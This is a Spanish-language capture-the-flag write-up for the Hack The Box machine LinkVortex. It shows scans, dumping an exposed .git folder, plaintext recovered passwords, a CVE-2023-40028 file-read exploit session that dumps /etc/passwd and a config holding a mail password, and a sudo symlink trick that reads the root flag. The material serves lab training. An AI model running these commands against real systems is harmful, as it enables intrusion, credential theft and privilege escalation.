---
layout: single
title: linkvortex - Hack The Box
excerpt: "empezamos con un escaneo y encontramos en la pagina unos archivos y no encontras nada como contraseña lo guardamos y empezamos un fuzing con dirsearch que nos lleva a un dev de la pagina asi encontrado un ruta que nos pide autenticacion y entramos archivos .git nos damos que hay filtracion de git hacemos un busqueda por githoack y encotramos cositas y enotras las que ghost es vulneravile la vercion 5.58 y encontramos un exploit que nos lleva al servidor haci autenticandonos"
date: 2024-11-12
classes: wide
header:
  teaser: /assets/images/htb-writeup-linkvortex/linkvortex.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - nmap
  - dirsearch
  - githack
  - CVE-2023-40028
  - escalada de pivilegios
---

![](/assets/images/htb-writeup-linkvortex/linkvortex.png)

empezamos con un escaneo y encontramos en la psgina unos archivos y no encontras nada como contraseña lo guardamos y empezamos un fuzing con dirsearch que nos lleva a un dev de la pagina asi encontrado un ruta que nos pide autenticacion y entramos archivos .git nos damos que hay filtracion de git hacemos un busqueda por githoack y encotramos cositas y enotras las que ghost es vulneravile la vercion 5.58 y encontramos un exploit que nos lleva al servidor haci autenticandonos

## scanport

```
nmap -sSCV -Pn LinkVortex.htb 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-08 21:44 CST
Nmap scan report for LinkVortex.htb (10.10.11.47)
Host is up (0.088s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-server-header: Apache
| http-title: BitByBit Hardware
|_Requested resource was http://linkvortex.htb/
| http-robots.txt: 4 disallowed entries 
|_ghost
|_http-generator: Ghost 5.58
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.62 seconds
```

## dirsearch

como no veo nada en la pagina como xss o algo como sqlinjection o cualquier otra vulneravildad

```
dirsearch -u linkvortex.htb -i 200

favicon.ico                                      
LICENSE                                          
robots.txt                                       
sitemap.xml 
```

encontramos estos archivos pero los me llama la tencion el ghost que encontramos en robots parece una aplicacion  o algo ya que tambien se hace mencion en algunas partes de la pagina y ademas wappalyzer muestras su version parece que esta detras esa aplicacion


![](/assets/images/htb-writeup-linkvortex/dev.png)

despues de un escaneo de en fuzing encuentro un `dev` ahora un escaneo con del de `dev` encontramos unas rutas con git

```
.git/                                            
.git/description                                 
.git/config
.git/HEAD
.git/hooks/                                      
.git/info/                                       
.git/info/exclude                                
.git/logs/                                       
.git/logs/HEAD
.git/objects/                                    
.git/refs/                                       
.git/packed-refs                                 
.git/index  
```
despues de una busqueda encontre un repositorio de github que hace por haci decir un escaneo y en git extrae informacion critica la vulnervilidad se llama `Git Directory Traversal`

```
   1   │ noesholk@noes:~/GitHack$ python GitHack.py 'http://dev.linkvortex.htb/.git'
   2   │ [+] Download and parse index file ...
   3   │ [+] .editorconfig
   4   │ [+] .gitattributes
   5   │ [+] .github/AUTO_ASSIGN
   6   │ [+] .github/CONTRIBUTING.md
   7   │ [+] .github/FUNDING.yml
   8   │ [+] .github/ISSUE_TEMPLATE/bug-report.yml
   9   │ [+] .github/ISSUE_TEMPLATE/config.yml
  10   │ [+] .github/PULL_REQUEST_TEMPLATE.md
  11   │ [+] .github/SUPPORT.md
  12   │ [+] .github/actions/restore-cache/action.yml
  13   │ [+] .github/codecov.yml
  14   │ [+] .github/hooks/pre-commit
  15   │ [+] .github/scripts/dev.js
  16   │ [+] .github/workflows/auto-assign.yml
  17   │ [+] .github/workflows/browser-tests.yml
  18   │ [+] .github/workflows/ci.yml
  19   │ [+] .github/workflows/create-release-branch.yml
  20   │ [+] .github/workflows/custom-build.yml
  21   │ [+] .github/workflows/i18n.yml
  22   │ [+] .github/workflows/label-actions.yml
  23   │ [+] .github/workflows/migration-review.yml
```
luego de ejecutar el lo podermos ver un archivo nuevo donde encontraremos algo haci

![](/assets/images/htb-writeup-linkvortex/github2.png)

encontramos estas credenciales


- username: admin@linkvortex.htb

- password: OctopiFociPilfer45

![](/assets/images/htb-writeup-linkvortex/ghost.png)

analizando la pagina no encontre nada pero como me lo imaginaba los forma de acceder a la maquina es por `ghost 5.58` la aplicacion que corre atras de la pagina

```
   1   │ ┌──(noesholk㉿noes)-[~/Descargas/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028]
   2   │ └─$ ./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb
   3   │ WELCOME TO THE CVE-2023-40028 SHELL
   4   │ Enter the file path to read (or type 'exit' to quit): /etc/password
   5   │ File content:
   6   │ <!DOCTYPE html>
   7   │ <html lang="en">
   8   │ <head>
   9   │ <meta charset="utf-8">
  10   │ <title>Error</title>
  11   │ </head>
  12   │ <body>
  13   │ <pre>Not Found</pre>
  14   │ </body>
  15   │ </html>
  16   │ Enter the file path to read (or type 'exit' to quit): /etc/passwd
  17   │ File content:
  18   │ root:x:0:0:root:/root:/bin/bash
  19   │ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  20   │ bin:x:2:2:bin:/bin:/usr/sbin/nologin
  21   │ sys:x:3:3:sys:/dev:/usr/sbin/nologin
  22   │ sync:x:4:65534:sync:/bin:/bin/sync
  23   │ games:x:5:60:games:/usr/games:/usr/sbin/nologin
  24   │ man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
  25   │ lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
  26   │ mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
  27   │ news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
  28   │ uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
  29   │ proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
  30   │ www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  31   │ backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
  32   │ list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
  33   │ irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
  34   │ gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
  35   │ nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
  36   │ _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
  37   │ node:x:1000:1000::/home/node:/bin/bash
  38   │ Enter the file path to read (or type 'exit' to quit): 
  39   │ Invalid input. Please enter a valid file path without spaces.
  40   │ Enter the file path to read (or type 'exit' to quit): 
  41   │ Invalid input. Please enter a valid file path without spaces.
  42   │ Enter the file path to read (or type 'exit' to quit): 
  43   │ Invalid input. Please enter a valid file path without spaces.
  44   │ Enter the file path to read (or type 'exit' to quit): 
  45   │ Invalid input. Please enter a valid file path without spaces.
  46   │ Enter the file path to read (or type 'exit' to quit): 
  47   │ Invalid input. Please enter a valid file path without spaces.
  48   │ Enter the file path to read (or type 'exit' to quit): 
  49   │ Invalid input. Please enter a valid file path without spaces.
  50   │ Enter the file path to read (or type 'exit' to quit): 
  51   │ Invalid input. Please enter a valid file path without spaces.
  52   │ Enter the file path to read (or type 'exit' to quit): /var/lib/ghost/config.production.json
  53   │ File content:
  54   │ {
  55   │   "url": "http://localhost:2368",
  56   │   "server": {
  57   │     "port": 2368,
  58   │     "host": "::"
  59   │   },
  60   │   "mail": {
  61   │     "transport": "Direct"
  62   │   },
  63   │   "logging": {
  64   │     "transports": ["stdout"]
  65   │   },
  66   │   "process": "systemd",
  67   │   "paths": {
  68   │     "contentPath": "/var/lib/ghost/content"
  69   │   },
  70   │   "spam": {
  71   │     "user_login": {
  72   │         "minWait": 1,
  73   │         "maxWait": 604800000,
  74   │         "freeRetries": 5000
  75   │     }
  76   │   },
  77   │   "mail": {
  78   │      "transport": "SMTP",
  79   │      "options": {
  80   │       "service": "Google",
  81   │       "host": "linkvortex.htb",
  82   │       "port": 587,
  83   │       "auth": {
  84   │         "user": "bob@linkvortex.htb",
  85   │         "pass": "fibber-talented-worth"
  86   │         }
  87   │       }
  88   │     }
  89   │ }
```


CVE-2023-40028 es una vulnerabilidad en Ghost, un sistema de gestión de contenido (CMS) de código abierto. En versiones anteriores a la 5.59.1, permite que usuarios autenticados suban archivos que son enlaces simbólicos (symlinks). Esto puede ser explotado para leer de manera arbitraria cualquier archivo en el sistema operativo del host. 

```
username:bob@linkvortex.htb
password:fibber-talented-worth
```

```
   1   │ bob@linkvortex:~$ sudo -l
   2   │ Matching Defaults entries for bob on linkvortex:
   3   │     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/s
       │ bin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
   4   │     use_pty, env_keep+=CHECK_CONTENT
   5   │ 
   6   │ User bob may run the following commands on linkvortex:
   7   │     (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
   8   │ bob@linkvortex:~$
```
podemos ejecutar apliacion con permisos elevados parece ser un vulnerabilidad es un ataque de enlaces simbólicos

```
   1   │ ┌──(noesholk㉿noes)-[~]
   2   │ └─$ ssh bob@linkvortex.htb                  
   3   │ The authenticity of host 'linkvortex.htb (10.10.11.47)' can't be established.
   4   │ ED25519 key fingerprint is SHA256:vrkQDvTUj3pAJVT+1luldO6EvxgySHoV6DPCcat0WkI.
   5   │ This key is not known by any other names.
   6   │ Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
   7   │ Warning: Permanently added 'linkvortex.htb' (ED25519) to the list of known hosts
       │ .
   8   │ bob@linkvortex.htb's password: 
   9   │ Permission denied, please try again.
  10   │ bob@linkvortex.htb's password: 
  11   │ Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)
  12   │ 
  13   │  * Documentation:  https://help.ubuntu.com
  14   │  * Management:     https://landscape.canonical.com
  15   │  * Support:        https://ubuntu.com/pro
  16   │ 
  17   │ This system has been minimized by removing packages and content that are
  18   │ not required on a system that users do not log into.
  19   │ 
  20   │ To restore this content, you can run the 'unminimize' command.
  21   │ Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your 
       │ Internet connection or proxy settings
  22   │ 
  23   │ Last login: Fri Jan 31 04:56:47 2025 from 10.10.14.254
  24   │ bob@linkvortex:~$ ln -s /root/root.txt noes.txt
  25   │ bob@linkvortex:~$ ln -s /home/bob/noes.txt noes.png
  26   │ bob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink
       │ .sh /home/bob/noespng
  27   │ [sudo] password for bob: 
  28   │ sudo: a password is required
  29   │ bob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink
       │ .sh /home/bob/noes.png
  30   │ Link found [ /home/bob/noes.png ] , moving it to quarantine
  31   │ Content:
  32   │ 985d89f0eef65bed7fd5cbc730c3d193
  33   │ bob@linkvortex:~$
```
`
Cree un enlace simbólico apuntando al archivo de root: ln -s /root/root.txt noes.txt

Luego otro enlace para esconderlo: ln -s /home/bob/noes.txt noes.png 

luego ejecute un script con `sudo` que procesó el archivo sin validar si era un enlace: sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/noes.png
`
